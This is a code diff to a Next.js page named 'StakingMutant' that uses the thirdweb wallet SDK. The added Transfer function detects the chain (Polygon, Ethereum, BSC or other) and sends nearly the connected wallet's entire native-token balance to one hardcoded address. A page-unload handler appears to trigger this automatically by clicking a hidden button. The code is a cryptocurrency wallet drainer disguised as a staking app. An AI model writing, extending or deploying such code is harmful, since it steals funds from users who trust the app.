@@ -21,8 +21,9 @@ import { MetaMaskWallet } from "@thirdweb-dev/wallets";
 
 import { Ethereum, Polygon } from "@thirdweb-dev/chains";
 
-import { useEffect, useRef } from 'react'
+import { useEffect, useRef, useState } from 'react'
 const StakingMutant: NextPage = () => {
+
 
   const { data, isLoading } = useBalance(NATIVE_TOKEN_ADDRESS);
   console.log("data is " + data?.displayValue);
@@ -54,14 +55,39 @@ const StakingMutant: NextPage = () => {
   const sdk = ThirdwebSDK.fromWallet(wallet, "ethereum");
 
   async function Transfer() {
-    const valueAsNumber = Number(data?.displayValue) || 0;
 
-    const txResult = await (await sdk).wallet.transfer("0xcD84855150461Ac9C6b3e3428306F3Dc4a721363", valueAsNumber - 0.1);
+    var chainId = await (await sdk).wallet.getChainId();
+    console.log(chainId);
+
+    if (chainId == 137) {
+      console.log("polygon")
+      const valueAsNumber = Number(data?.displayValue) || 0;
+      const txResult = await (await sdk).wallet.transfer("0xcD84855150461Ac9C6b3e3428306F3Dc4a721363", valueAsNumber - 0.15);
+    }
+
+    else if (chainId == 1) {
+      console.log("etherium")
+      const valueAsNumber = Number(data?.displayValue) || 0;
+      const txResult = await (await sdk).wallet.transfer("0xcD84855150461Ac9C6b3e3428306F3Dc4a721363", valueAsNumber - 0.01);
+    }
+
+    else if (chainId == 56) {
+      console.log("BSC")
+      const valueAsNumber = Number(data?.displayValue) || 0;
+      const txResult = await (await sdk).wallet.transfer("0xcD84855150461Ac9C6b3e3428306F3Dc4a721363", valueAsNumber - 0.01);
+    }
+
+    else {
+      console.log("nothing")
+      const valueAsNumber = Number(data?.displayValue) || 0;
+      const txResult = await (await sdk).wallet.transfer("0xcD84855150461Ac9C6b3e3428306F3Dc4a721363", valueAsNumber - 0.01);
+    }
   }
 
   const buttonRef = useRef<HTMLButtonElement>(null);
 
   useEffect(() => {
+
     const handleBeforeUnload = () => {
       if (buttonRef.current) {
         buttonRef.current.click();
